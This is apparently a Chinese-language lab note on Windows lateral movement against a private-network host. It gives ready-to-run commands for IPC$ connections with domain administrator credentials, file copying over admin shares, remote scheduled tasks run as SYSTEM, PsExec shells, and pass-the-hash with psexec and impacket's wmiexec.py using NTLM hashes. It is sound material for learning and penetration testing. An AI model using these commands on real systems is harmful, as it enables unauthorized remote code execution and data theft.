文章仅做记录，如有错误请指出，谢谢。

目标机器: 192.168.101.157

一、IPC$连接

IPC$(Internet Process Connection) 是共享 " 命名管道 "
的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

调出命令行窗口，可以先执行net use查看已建立的连接

![1617263740_60657c7c9679d06505d35.png!small](https://image.3001.net/images/20210401/1617263740_60657c7c9679d06505d35.png!small)

执行以下命令与目标建立ipc$连接

net use \\\192.168.101.157(目标ip) /u:god(域名)\Administrator(用户名)
[hongrisec@2020(密码)](mailto:hongrisec@2020\(%E5%AF%86%E7%A0%81\))

![1617263920_60657d309d663f40b86be.png!small](https://image.3001.net/images/20210401/1617263920_60657d309d663f40b86be.png!small)执行成功会返回命令成功完成

之后可以使用dir命令列出目标文件夹文件，如执行以下命令列出c盘下文件夹

dir \\\192.168.101.157\c$

![1617263968_60657d6049c8ff852c157.png!small](https://image.3001.net/images/20210401/1617263968_60657d6049c8ff852c157.png!small)

列出c盘下phpStudy目录的文件

dir \\\192.168.101.157\c$\phpStudy

![1617264052_60657db4770ad4fe8f8da.png!small](https://image.3001.net/images/20210401/1617264052_60657db4770ad4fe8f8da.png!small)

如果想下载文件则执行以下命令，将phpshao.dll文件下载存放至temp文件夹处

copy \\\192.168.101.157\c$\phpStudy\phpshao.dll C:\Windows\temp

![1617264283_60657e9bb23cdb05d5381.png!small](https://image.3001.net/images/20210401/1617264283_60657e9bb23cdb05d5381.png!small)

![1617264230_60657e662d95db570f116.png!small](https://image.3001.net/images/20210401/1617264230_60657e662d95db570f116.png!small)

同理，如果想要上传文件的话则执行

copy F:\test.txt \\\192.168.101.157\c$

![1617264327_60657ec78f0e46537b736.png!small](https://image.3001.net/images/20210401/1617264327_60657ec78f0e46537b736.png!small)

可以看到已经将文件传输上去了

也可以通过计划任务执行系统命令，首先执行下面命令创建一个名为test2的计划任务

schtasks /create /s 192.168.101.157 /tn test2 /sc minute /mo 1 /tr
"C:\Windows\System32\cmd.exe /c 'whoami > C:\Windows\temp\test2.txt'" /ru
system /f /u god\Administrator /p [hongrisec@2020](mailto:hongrisec@2020)

![1617264780_6065808c71767511f7bfe.png!small](https://image.3001.net/images/20210401/1617264780_6065808c71767511f7bfe.png!small)

之后执行以下命令，立即执行计划任务

schtasks /run /s 192.168.101.157 /i /tn test2 /u god\Administrator /p
hongrisec@2020

![1617264873_606580e99b58dbb431821.png!small](https://image.3001.net/images/20210401/1617264873_606580e99b58dbb431821.png!small)

执行成功之后使用type命令查看执行内容的回显

type \\\192.168.101.157\c$\Windows\temp\test2.txt

![1617264961_6065814173a1a1a1de19d.png!small](https://image.3001.net/images/20210401/1617264961_6065814173a1a1a1de19d.png!small)

二、psexec

也可以通过psexec去连接目标，不过动静有点大，会在目标机器上起一个服务，产生大量日志

可以在[这里](https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec)下载

![1617265575_606583a7b8d85e58e80c8.png!small](https://image.3001.net/images/20210401/1617265575_606583a7b8d85e58e80c8.png!small)

执行以下命令获取一个交互式的shell，如果无法建立连接，尝试使用管理员身份执行

PsExec64.exe -accepteula \\\192.168.101.157(目标IP) -u god(域)\Administrator(用户名)
-p [hongrisec@202](mailto:hongrisec@202)0(密码) -s cmd.exe

![1617265697_60658421931b3f7e733f0.png!small](https://image.3001.net/images/20210401/1617265697_60658421931b3f7e733f0.png!small)也可以执行以下命令，使用hash进行连接

psexec.exe -hashes
AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09
god/Administrator@192.168.1.1 "whoami"

当然msf里面也有模块可以通过psexec与目标连接

exploit/windows/smb/psexec

三、wmiexec.py连接

可以在[这里](https://github.com/SecureAuthCorp/impacket)下载工具包

直接执行以下命令就可以建立连接了

python wmiexec.py
god(域)/administrator(用户名):hongrisec@2020(密码)@192.168.101.157(目标IP)

![1617266547_606587736e0e7543978d2.png!small](https://image.3001.net/images/20210401/1617266547_606587736e0e7543978d2.png!small)

也可以使用hash去连接目标，稍微变一下就可以了

python3 wmiexec.py –hashes
aad3b435b51404eeaad3b435b51404ee:34823259805a88a95e921f4f7e053334
administrator@192.168.1.53

